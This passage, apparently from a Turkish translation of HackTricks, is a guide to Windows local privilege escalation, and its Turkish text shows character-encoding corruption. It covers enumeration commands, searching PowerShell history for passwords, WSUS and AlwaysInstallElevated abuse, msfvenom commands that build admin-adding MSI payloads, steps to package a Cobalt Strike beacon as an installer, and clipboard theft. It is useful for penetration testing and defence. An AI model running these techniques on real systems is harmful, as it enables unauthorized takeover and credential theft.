# Windows Local Privilege Escalation

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

* **Bir siber gÃ¼venlik ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz? Åirketinizin HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz? ya da PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* **KatÄ±lÄ±n** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discord grubuna**]\(https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* takip edin.\*\*
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaÅŸÄ±n.**

</details>

### **Windows yerel ayrÄ±calÄ±k yÃ¼kseltme vektÃ¶rlerini aramak iÃ§in en iyi araÃ§:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## BaÅŸlangÄ±Ã§ â€‹â€‹Windows Teorisi

### EriÅŸim Ä°zinleri

**Windows EriÅŸim Ä°zinlerini bilmiyorsanÄ±z, devam etmeden Ã¶nce aÅŸaÄŸÄ±daki sayfayÄ± okuyun:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkÄ±nda daha fazla bilgi iÃ§in aÅŸaÄŸÄ±daki sayfaya bakÄ±n:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### BÃ¼tÃ¼nlÃ¼k Seviyeleri

**Windows'ta bÃ¼tÃ¼nlÃ¼k seviyelerini bilmiyorsanÄ±z, devam etmeden Ã¶nce aÅŸaÄŸÄ±daki sayfayÄ± okumalÄ±sÄ±nÄ±z:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows GÃ¼venlik Kontrolleri

Windows'ta **sistemi numaralandÄ±rmanÄ±zÄ± engelleyebilecek**, yÃ¼rÃ¼tÃ¼lebilir dosyalarÄ± Ã§alÄ±ÅŸtÄ±rmanÄ±zÄ± veya hatta **etkinliklerinizi tespit etmenizi engelleyebilecek** farklÄ± ÅŸeyler bulunmaktadÄ±r. AyrÄ±calÄ±k yÃ¼kseltme numaralandÄ±rmasÄ±na baÅŸlamadan Ã¶nce bu **savunma mekanizmalarÄ±nÄ±** okumalÄ± ve **tÃ¼m bu savunmalarÄ±** **numaralandÄ±rmalÄ±sÄ±nÄ±z**:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Sistem Bilgisi

### SÃ¼rÃ¼m bilgisi numaralandÄ±rma

Windows sÃ¼rÃ¼mÃ¼nÃ¼n herhangi bir bilinen zafiyeti olup olmadÄ±ÄŸÄ±nÄ± kontrol edin (uygulanan yamalarÄ± da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### SÃ¼rÃ¼m SÄ±zÄ±ntÄ±larÄ±

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft gÃ¼venlik aÃ§Ä±klarÄ± hakkÄ±nda detaylÄ± bilgi aramak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r. Bu veritabanÄ±nda 4,700'den fazla gÃ¼venlik aÃ§Ä±ÄŸÄ± bulunmaktadÄ±r, Windows ortamÄ±nÄ±n sunduÄŸu **geniÅŸ saldÄ±rÄ± yÃ¼zeyini** gÃ¶stermektedir.

**Sistemde**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson gÃ¶mÃ¼lÃ¼dÃ¼r)_

**Yerel sistem bilgileriyle**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit Github depolarÄ±:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam deÄŸiÅŸkenlerinde saklanan herhangi bir kimlik bilgisi/Ã¶nemli bilgi var mÄ±?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```

### PowerShell GeÃ§miÅŸi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transkript DosyalarÄ±

Bunu nasÄ±l aÃ§acaÄŸÄ±nÄ±zÄ± [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden Ã¶ÄŸrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

### PowerShell ModÃ¼l GÃ¼nlÃ¼ÄŸÃ¼

PowerShell boru hattÄ± yÃ¼rÃ¼tmelerinin ayrÄ±ntÄ±larÄ± kaydedilir, yÃ¼rÃ¼tÃ¼len komutlarÄ±, komut Ã§aÄŸrÄ±larÄ±nÄ± ve betik parÃ§alarÄ±nÄ± kapsar. Bununla birlikte, tam yÃ¼rÃ¼tme ayrÄ±ntÄ±larÄ± ve Ã§Ä±ktÄ± sonuÃ§larÄ± yakalanmayabilir.

Bunu etkinleÅŸtirmek iÃ§in, belgelerin "Transkript dosyalarÄ±" bÃ¶lÃ¼mÃ¼ndeki talimatlarÄ± izleyin ve **"Powershell Transcription"** yerine **"ModÃ¼l GÃ¼nlÃ¼ÄŸÃ¼"** seÃ§eneÄŸini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Son 15 etkinliÄŸi PowersShell gÃ¼nlÃ¼klerinden gÃ¶rÃ¼ntÃ¼lemek iÃ§in ÅŸunu yÃ¼rÃ¼tebilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Komut BloÄŸu GÃ¼nlÃ¼ÄŸÃ¼**

Komut bloÄŸunun yÃ¼rÃ¼tÃ¼lmesine iliÅŸkin tam bir etkinlik ve iÃ§erik kaydÄ± tutulur, bÃ¶ylece her kod bloÄŸu Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda belgelenir. Bu sÃ¼reÃ§, her etkinliÄŸin kapsamlÄ± bir denetim izini korur ve bu da adli biliÅŸim ve kÃ¶tÃ¼ niyetli davranÄ±ÅŸlarÄ±n analizi iÃ§in deÄŸerli olur. YÃ¼rÃ¼tme anÄ±nda tÃ¼m etkinliklerin belgelenmesiyle, iÅŸlem hakkÄ±nda detaylÄ± iÃ§gÃ¶rÃ¼ler saÄŸlanÄ±r.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block iÃ§in gÃ¼nlÃ¼k olaylar, Windows Olay GÃ¶rÃ¼ntÃ¼leyicisi'nde ÅŸu yol Ã¼zerinde bulunabilir: **Uygulamalar ve Hizmetler GÃ¼nlÃ¼kleri > Microsoft > Windows > PowerShell > Operasyonel**.\
Son 20 olayÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in ÅŸunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ä°nternet AyarlarÄ±

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### SÃ¼rÃ¼cÃ¼ler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

EÄŸer gÃ¼ncellemeler http yerine http**S** kullanÄ±larak istenmiyorsa sistem tehlikeye girebilir.

AÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rarak aÄŸÄ±n SSL olmayan WSUS gÃ¼ncellemesi kullandÄ±ÄŸÄ±nÄ± kontrol edebilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

EÄŸer ÅŸÃ¶yle bir yanÄ±t alÄ±rsanÄ±z:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

Ve eÄŸer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` deÄŸeri `1`'e eÅŸitse.

O zaman, **saldÄ±rÄ±labilir**. EÄŸer son kayÄ±t 0'a eÅŸitse, o zaman WSUS giriÅŸi yok sayÄ±lacaktÄ±r.

Bu zafiyetleri sÃ¶mÃ¼rmek iÃ§in [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)gibi araÃ§larÄ± kullanabilirsiniz - Bunlar, 'sahte' gÃ¼ncellemeleri non-SSL WSUS trafiÄŸine enjekte etmek iÃ§in kullanÄ±lan MiTM silahlaÅŸtÄ±rÄ±lmÄ±ÅŸ saldÄ±rÄ± betikleridir.

AraÅŸtÄ±rmayÄ± buradan okuyabilirsiniz:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Tam raporu buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hata tarafÄ±ndan sÃ¶mÃ¼rÃ¼len aÃ§Ä±k ÅŸudur:

> EÄŸer yerel kullanÄ±cÄ± proxy'sini deÄŸiÅŸtirme yetkimiz varsa ve Windows GÃ¼ncellemeleri, Internet Explorer'Ä±n ayarlarÄ±nda yapÄ±landÄ±rÄ±lan proxy'yi kullanÄ±yorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak Ã§alÄ±ÅŸtÄ±rarak kendi trafiÄŸimizi ele geÃ§irip varlÄ±ÄŸÄ±mÄ±zda yÃ¼kseltilmiÅŸ bir kullanÄ±cÄ± olarak kod Ã§alÄ±ÅŸtÄ±rma yetkimiz olacaktÄ±r.
>
> AyrÄ±ca, WSUS hizmeti mevcut kullanÄ±cÄ±nÄ±n ayarlarÄ±nÄ± kullanÄ±r ve bu nedenle sertifika deposunu kullanÄ±r. WSUS ana bilgisayar adÄ± iÃ§in kendinden imzalÄ± bir sertifika oluÅŸturursak ve bu sertifikayÄ± mevcut kullanÄ±cÄ±nÄ±n sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiÄŸini ele geÃ§irebiliriz. WSUS, sertifikada gÃ¼ven ilk kullanÄ±mda bir gÃ¼ven Ã¼zerine gÃ¼ven tÃ¼rÃ¼nde doÄŸrulama mekanizmalarÄ± uygulamaz. Sunulan sertifika kullanÄ±cÄ± tarafÄ±ndan gÃ¼venilirse ve doÄŸru ana bilgisayar adÄ±na sahipse, hizmet tarafÄ±ndan kabul edilecektir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracÄ±nÄ± kullanarak sÃ¶mÃ¼rebilirsiniz (Ã¶zgÃ¼r bÄ±rakÄ±ldÄ±ÄŸÄ±nda).

## KrbRelayUp

Belirli koÅŸullar altÄ±nda Windows **alan** ortamlarÄ±nda bir **yerel ayrÄ±calÄ±k yÃ¼kseltme** zafiyeti bulunmaktadÄ±r. Bu koÅŸullar, **LDAP imzalamanÄ±n zorunlu olmadÄ±ÄŸÄ±,** kullanÄ±cÄ±larÄ±n **Kaynak TabanlÄ± KÄ±sÄ±tlanmÄ±ÅŸ Delege (RBCD) yapÄ±landÄ±rmasÄ±na izin veren** ve kullanÄ±cÄ±larÄ±n alan iÃ§inde bilgisayarlar oluÅŸturabilme yeteneÄŸine sahip olduÄŸu ortamlarÄ± iÃ§erir. Bu **gereksinimlerin** varsayÄ±lan ayarlar kullanÄ±larak karÅŸÄ±landÄ±ÄŸÄ±nÄ± belirtmek Ã¶nemlidir.

SÃ¶mÃ¼rÃ¼yÃ¼ [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulabilirsiniz.

SaldÄ±rÄ±nÄ±n akÄ±ÅŸÄ± hakkÄ±nda daha fazla bilgi iÃ§in [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) adresine bakÄ±n.

## AlwaysInstallElevated

EÄŸer bu 2 kayÄ±t **etkinse** (deÄŸeri **0x1** ise), herhangi bir ayrÄ±calÄ±ÄŸa sahip kullanÄ±cÄ±lar `*.msi` dosyalarÄ±nÄ± NT AUTHORITY\\**SYSTEM** olarak **yÃ¼kleme** (Ã§alÄ±ÅŸtÄ±rma) yapabilir.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit yÃ¼k yÃ¼kleri

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

EÄŸer bir meterpreter oturumunuz varsa, bu tekniÄŸi otomatikleÅŸtirmek iÃ§in **`exploit/windows/local/always_install_elevated`** modÃ¼lÃ¼nÃ¼ kullanabilirsiniz.

### PowerUP

YÃ¼kseltilmiÅŸ ayrÄ±calÄ±klar iÃ§in bir Windows MSI ikili dosyasÄ± oluÅŸturmak iÃ§in power-up'tan `Write-UserAddMSI` komutunu kullanÄ±n. Bu betik, kullanÄ±cÄ±/grup eklemesi iÃ§in bir kullanÄ±cÄ± arabirimi eriÅŸimine ihtiyaÃ§ duyan Ã¶nceden derlenmiÅŸ bir MSI yÃ¼kleyicisi oluÅŸturur:

```
Write-UserAddMSI
```

### MSI SargÄ±sÄ±

Bu araÃ§larÄ± kullanarak bir MSI sargÄ±sÄ± oluÅŸturmayÄ± Ã¶ÄŸrenmek iÃ§in bu kÄ±lavuzu okuyun. **YalnÄ±zca** **komut satÄ±rlarÄ±nÄ±** **Ã§alÄ±ÅŸtÄ±rmak** istiyorsanÄ±z bir "**.bat**" dosyasÄ±nÄ± sargÄ±layabilirsiniz.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX ile MSI OluÅŸturma

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio ile MSI OluÅŸturma

* Cobalt Strike veya Metasploit ile **yeni bir Windows EXE TCP yÃ¼kÃ¼** oluÅŸturun `C:\privesc\beacon.exe`
* **Visual Studio**'yu aÃ§Ä±n, **Yeni bir proje oluÅŸtur**'u seÃ§in ve arama kutusuna "kurulumcu" yazÄ±n. **Kurulum SihirbazÄ±** projesini seÃ§in ve **Ä°leri**'ye tÄ±klayÄ±n.
* Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`**'yi kullanÄ±n, **Ã§Ã¶zÃ¼mÃ¼ ve projeyi aynÄ± dizine yerleÅŸtir** seÃ§eneÄŸini iÅŸaretleyin ve **OluÅŸtur**'a tÄ±klayÄ±n.
* **Ä°leri**'ye tÄ±klayarak devam edin ve 4 adÄ±mdan 3'Ã¼ne (dahil edilecek dosyalarÄ± seÃ§me) ulaÅŸana kadar devam edin. **Ekle**'ye tÄ±klayÄ±n ve oluÅŸturduÄŸunuz Beacon yÃ¼kÃ¼nÃ¼ seÃ§in. ArdÄ±ndan **Bitir**'e tÄ±klayÄ±n.
* **Ã‡Ã¶zÃ¼m Gezgini**'nde **AlwaysPrivesc** projesini vurgulayÄ±n ve **Ã–zellikler**'de **Hedef Platform**'u **x86** yerine **x64** olarak deÄŸiÅŸtirin.
* Kurulan uygulamayÄ± daha gerÃ§ekÃ§i gÃ¶sterebilecek **Yazar** ve **Ãœretici** gibi diÄŸer Ã¶zellikleri deÄŸiÅŸtirebilirsiniz.
* Projeye saÄŸ tÄ±klayÄ±n ve **GÃ¶rÃ¼nÃ¼m > Ã–zel Eylemler**'i seÃ§in.
* **YÃ¼kle**'ye saÄŸ tÄ±klayÄ±n ve **Ã–zel Eylem Ekle**'yi seÃ§in.
* **Uygulama KlasÃ¶rÃ¼**ne Ã§ift tÄ±klayÄ±n, **beacon.exe** dosyanÄ±zÄ± seÃ§in ve **Tamam**'a tÄ±klayÄ±n. Bu, kurulumcu Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda beacon yÃ¼kÃ¼nÃ¼n hemen yÃ¼rÃ¼tÃ¼lmesini saÄŸlar.
* **Ã–zel Eylem Ã–zellikleri**'nde **Run64Bit**'i **True** olarak deÄŸiÅŸtirin.
* Son olarak, **derleyin**.
* \`Dosya 'beacon-tcp.exe', 'x86' hedef platformuyla uyumlu deÄŸil' uyarÄ±sÄ± gÃ¶rÃ¼ntÃ¼lenirse, platformu x64 olarak ayarladÄ±ÄŸÄ±nÄ±zdan emin olun.

### MSI Kurulumu

KÃ¶tÃ¼cÃ¼l `.msi` dosyasÄ±nÄ±n **arkaplanda** **kurulumunu** **Ã§alÄ±ÅŸtÄ±rmak** iÃ§in:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in ÅŸunu kullanabilirsiniz: _exploit/windows/local/always\_install\_elevated_

## AntivirÃ¼s ve AlgÄ±layÄ±cÄ±lar

### Denetim AyarlarÄ±

Bu ayarlar neyin **gÃ¼nlÃ¼ÄŸe kaydedildiÄŸini** belirler, bu yÃ¼zden dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, gÃ¼nlÃ¼klerin nereye gÃ¶nderildiÄŸini bilmek aÃ§Ä±sÄ±ndan ilginÃ§tir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, yerel YÃ¶netici ÅŸifrelerinin yÃ¶netimi iÃ§in tasarlanmÄ±ÅŸ olup, her ÅŸifrenin alan adÄ±na katÄ±lan bilgisayarlarda **benzersiz, rastgele ve dÃ¼zenli olarak gÃ¼ncellendiÄŸini** saÄŸlar. Bu ÅŸifreler Active Directory iÃ§inde gÃ¼venli bir ÅŸekilde depolanÄ±r ve yalnÄ±zca ACL'ler aracÄ±lÄ±ÄŸÄ±yla yeterli izinleri verilen kullanÄ±cÄ±lar tarafÄ±ndan eriÅŸilebilir, bÃ¶ylece yetkilendirildiklerinde yerel yÃ¶netici ÅŸifrelerini gÃ¶rebilirler.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

EÄŸer etkinse, **dÃ¼z metin ÅŸifreleri LSASS'ta** (Yerel GÃ¼venlik Otoritesi Alt Sistemi Hizmeti) depolanÄ±r.\
[**WDigest hakkÄ±nda daha fazla bilgi iÃ§in bu sayfaya bakÄ±n**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Koruma

**Windows 8.1** ile baÅŸlayarak, Microsoft, yerel gÃ¼venlik otoritesi (LSA) iÃ§in geliÅŸtirilmiÅŸ koruma saÄŸladÄ±, bu da gÃ¼venliÄŸi daha da artÄ±rarak gÃ¼venilmeyen iÅŸlemlerin belleÄŸini okuma veya kod enjekte etme giriÅŸimlerini **engellemektedir**.\
[**LSA Koruma hakkÄ±nda daha fazla bilgi iÃ§in buraya tÄ±klayÄ±n**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Kimlik Bilgileri KorumasÄ±

**Kimlik Bilgileri KorumasÄ±**, **Windows 10**'da tanÄ±tÄ±ldÄ±. AmacÄ±, bir cihazda depolanan kimlik bilgilerini, geÃ§iÅŸ yapÄ±labilir hash saldÄ±rÄ±larÄ± gibi tehditlere karÅŸÄ± korumaktÄ±r.| [**Kimlik Bilgileri KorumasÄ± hakkÄ±nda daha fazla bilgi iÃ§in buraya tÄ±klayÄ±n.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Ã–nbelleÄŸe AlÄ±nmÄ±ÅŸ Kimlik Bilgileri

**Alan kimlik bilgileri**, iÅŸletim sistemi bileÅŸenleri tarafÄ±ndan doÄŸrulanan ve **Yerel GÃ¼venlik Otoritesi** (LSA) tarafÄ±ndan kullanÄ±lan kimlik bilgileridir. Bir kullanÄ±cÄ±nÄ±n oturum aÃ§ma verileri bir kayÄ±tlÄ± gÃ¼venlik paketi tarafÄ±ndan doÄŸrulandÄ±ÄŸÄ±nda, genellikle kullanÄ±cÄ± iÃ§in alan kimlik bilgileri oluÅŸturulur.\
[**Ã–nbelleÄŸe AlÄ±nmÄ±ÅŸ Kimlik Bilgileri hakkÄ±nda daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## KullanÄ±cÄ±lar ve Gruplar

### KullanÄ±cÄ±larÄ± ve GruplarÄ± SÄ±ralama

Ä°lgili izinlere sahip olabileceÄŸiniz gruplarÄ± kontrol etmelisiniz

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### AyrÄ±calÄ±klÄ± gruplar

EÄŸer **bir ayrÄ±calÄ±klÄ± gruba ait iseniz ayrÄ±calÄ±klarÄ± yÃ¼kseltebilirsiniz**. AyrÄ±calÄ±klÄ± gruplar hakkÄ±nda bilgi edinin ve ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in nasÄ±l kÃ¶tÃ¼ye kullanabileceÄŸinizi buradan Ã¶ÄŸrenin:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipÃ¼lasyonu

Bir **token**'Ä±n ne olduÄŸu hakkÄ±nda daha fazla bilgi edinin bu sayfada: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
**Ä°lginÃ§ tokenlar hakkÄ±nda ve onlarÄ± nasÄ±l kÃ¶tÃ¼ye kullanabileceÄŸiniz hakkÄ±nda bilgi edinmek iÃ§in** aÅŸaÄŸÄ±daki sayfayÄ± kontrol edin:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasÃ¶rleri

```powershell
dir C:\Users
Get-ChildItem C:\Users
```

### Åifre PolitikasÄ±

```bash
net accounts
```

### Panonun iÃ§eriÄŸini al

```plaintext
Bu saldÄ±rÄ±, bir kullanÄ±cÄ±nÄ±n panosundaki verileri Ã§almak iÃ§in kullanÄ±labilir. Bu veriler genellikle hassas bilgiler iÃ§erebilir, bu nedenle bu saldÄ±rÄ± tÃ¼rÃ¼ dikkatle kullanÄ±lmalÄ±dÄ±r.
```

```bash
powershell -command "Get-Clipboard"
```

## Ã‡alÄ±ÅŸan Ä°ÅŸlemler

### Dosya ve KlasÃ¶r Ä°zinleri

Ä°lk olarak, iÅŸlemleri listele ve iÅŸlemin komut satÄ±rÄ±nda **parolalarÄ± kontrol et**.\
**Ã‡alÄ±ÅŸan bazÄ± ikili dosyalarÄ± Ã¼zerine yazabilir** veya olasÄ± [**DLL KaÃ§Ä±rma saldÄ±rÄ±larÄ±nÄ±**](dll-hijacking/) sÃ¶mÃ¼rmek iÃ§in ikili dosyanÄ±n klasÃ¶rÃ¼ne yazma izinlerinizin olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman Ã§alÄ±ÅŸan olasÄ± **electron/cef/chromium hata ayÄ±klayÄ±cÄ±larÄ±nÄ±** kontrol edin, ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in kÃ¶tÃ¼ye kullanabilirsiniz.

**Ä°ÅŸlem ikili dosyalarÄ±nÄ±n izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```

**Ä°ÅŸlem ikili dosyalarÄ±nÄ±n klasÃ¶rlerinin izinlerini kontrol etme (DLL Hijacking)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Bellek Åifre MadenciliÄŸi

